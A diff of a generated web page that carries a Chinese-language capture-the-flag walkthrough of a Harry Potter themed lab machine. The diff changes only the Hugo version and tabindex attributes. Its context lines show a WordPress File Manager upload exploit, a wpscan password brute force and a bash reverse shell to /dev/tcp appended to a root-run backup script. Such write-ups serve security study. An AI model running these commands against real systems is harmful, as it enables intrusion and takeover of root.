@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -290,7 +290,7 @@ nmap --min-rate<span class="o">=</span><span class="m">10000</span> -T4 -sC -A 1
 </code></pre></td></tr></table></div>
 </div>
 </div><p>扫描结果</p>
-<pre><code>PORT   STATE SERVICE VERSION
+<pre tabindex="0"><code>PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
 |   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
@@ -322,7 +322,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></td></tr></table></div>
 </div>
 </div><p>扫不粗来，需要api-token。。。懒得注册了，直接<a href="https://www.0x1ceb00da.net/harry-potter-aragog/" target="_blank" rel="noopener">wp</a>得到漏洞信息</p>
-<pre><code> | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
+<pre tabindex="0"><code> | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
  |     Fixed in: 6.9
  |     References:
  |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
@@ -352,7 +352,7 @@ run
 </div><p>成功获得shell。</p>
 <h3 id="horcrux1txt"><a href="#horcrux1txt" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:horcrux1txt" class="headings">horcrux1.txt</a></h3>
 <p>在<code>/home/hagrid98</code>下获得第一个flag：</p>
-<pre><code>horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
+<pre tabindex="0"><code>horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
 # horcrux_{1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets}
 </code></pre><h3 id="horcrux2txt"><a href="#horcrux2txt" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:horcrux2txt" class="headings">horcrux2.txt</a></h3>
 <p>没啥办法，继续收集信息吧，在<code>/etc/wordpress</code>获得配置信息</p>
@@ -389,11 +389,11 @@ run
 </code></pre></td></tr></table></div>
 </div>
 </div><p>在<code>wp_users</code>表中找到用户信息</p>
-<pre><code>hagrid98 | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin | hagrid98@localhost.local
+<pre tabindex="0"><code>hagrid98 | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin | hagrid98@localhost.local
 </code></pre><p>知道管理员用户名就可以爆破wordpress后台密码，再上wpscan</p>
-<pre><code>wpscan --url http://192.168.150.135/blog --passwords /usr/share/wordlists/fasttrack.txt --usernames hagrid98
+<pre tabindex="0"><code>wpscan --url http://192.168.150.135/blog --passwords /usr/share/wordlists/fasttrack.txt --usernames hagrid98
 </code></pre><p>结果：<code>Username: hagrid98, Password: password123</code>，然后执行<code>su hagrid98 </code>登录用户。这样我们就有权限来读取用户目录下的<code>.viminfo</code>文件来了解vim操作的内容</p>
-<pre><code># This viminfo file was generated by Vim 8.1.
+<pre tabindex="0"><code># This viminfo file was generated by Vim 8.1.
 # You may edit it if you're careful!
 
 # Viminfo version
@@ -448,7 +448,7 @@ run
         +       1       11
         +       3       20
 </code></pre><p>可以看到这里对文件<code>/opt/.backup.sh</code>做出过修改，既然之前能写入文件，那么我们肯定也有权限对其作出修改，简简单单弹个shell</p>
-<pre><code>echo &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.150.128/5555 0&gt;&amp;1'&quot; &gt;&gt; /opt/.backup.sh
+<pre tabindex="0"><code>echo &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.150.128/5555 0&gt;&amp;1'&quot; &gt;&gt; /opt/.backup.sh
 </code></pre><p>接下来就出现了一个问题，如果直接执行脚本，那不还是这个用户吗？那有什么意义呢？我们可以看脚本内容</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
@@ -459,11 +459,11 @@ run
 </code></pre></td></tr></table></div>
 </div>
 </div><p>将文件备份到tmp下，现在去检查备份目录的权限</p>
-<pre><code>drwxr-xr-x 5 root root 4096 May 14 19:08 tmp_wp_uploads
+<pre tabindex="0"><code>drwxr-xr-x 5 root root 4096 May 14 19:08 tmp_wp_uploads
 </code></pre><p>可以看到这是root权限，说明执行cp命令的是root，换言之，执行脚本的是root，那么我们的弹shell弹的就是root的shell，理解了之后访问一下站点激活备份，成功弹到root的shell。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210515000753.png" alt=""></p>
 <p>获得flag2</p>
-<pre><code>horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
+<pre tabindex="0"><code>horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
 # horcrux_{2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre}
 </code></pre>
             </div>
